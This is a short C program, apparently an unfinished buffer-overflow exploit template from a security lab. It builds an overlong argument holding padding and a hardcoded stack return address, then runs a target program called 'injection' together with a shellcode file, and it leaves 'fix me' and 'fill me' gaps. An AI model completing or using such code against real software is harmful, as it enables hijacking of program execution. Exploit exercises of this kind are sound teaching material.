#include <stdio.h>
#include <unistd.h>
#define OFFSET 1000 /*fix me*/
int main(int argc, char** argv) {
    char* argv2[] = {"injection", "", "shellcode.bin", NULL};
    char buf[(OFFSET+5)] = "12345678as\xa2\xeb\xff\xbf";

    //fill me

    argv2[1] = buf;
    execv("./injection",argv2);
    return 0;
}

